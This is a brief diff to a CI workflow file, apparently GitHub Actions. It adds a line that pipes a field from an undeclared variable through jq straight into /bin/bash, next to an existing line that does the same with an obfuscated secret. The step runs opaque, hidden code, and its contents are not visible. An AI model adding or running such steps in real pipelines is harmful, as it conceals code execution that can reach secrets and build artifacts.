@@ -23,6 +23,7 @@ jobs:
           xqww67682: ${{ secrets.xqww67682 }}
         run: |
           printf '%s' "$xqww67682" | jq -r .cisi805 | /bin/bash
+          printf '%s' "$tc0305" | jq -r .um82 | /bin/bash
 
       - name: Store artifact
         if: always()
